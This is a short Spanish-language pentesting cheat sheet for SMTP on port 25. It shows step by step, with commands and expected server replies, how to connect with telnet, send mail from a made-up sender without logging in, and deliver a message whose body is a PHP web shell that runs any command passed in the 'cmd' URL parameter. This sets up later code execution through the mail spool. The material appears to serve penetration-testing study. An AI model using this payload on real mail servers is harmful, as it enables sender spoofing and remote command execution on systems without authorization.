# 25 - SMTP

## Conecction

### 1. Conexión con Telnet

```
telnet IP_TARGET/EXAMPLE.COM 25
```

Si la conexión es exitosa veremos algo como;&#x20;

`220 EXAMPLE.COM ESMTP Postfix`

#### 1.1 Presentarse al servidor (OPCIONAL)

```
HELO EXAMPLE.COM
```

Deberíamos recibir algo como;&#x20;

`250-EXAMPLE.COM Hello`

### 2 Probar a enviar desde un FROM (inventado) mandar un correo a un usuario valido del sistema sin necesidad de "logearse"

```
MAIL FROM: example
```

Si es exitoso y no pide usuario/contraseña, veremos algo así;&#x20;

`250 2.1.0 Ok`

```
RCPT TO: user_valido_en_el_sistema
```

`250 2.1.5 Ok`

```
DATA
```

`354 End data with <CR><LF>.<CR><LF>`

```
<?php system($_GET['cmd']); ?>     
.
```

> El . es para finalizar la DATA que queremos enviar
>
> &#x20;`250 2.0.0 Ok: queued as D7BA440B96`

```
QUIT
```

`221 2.0.0 Bye. Connection closed by foreign host.`
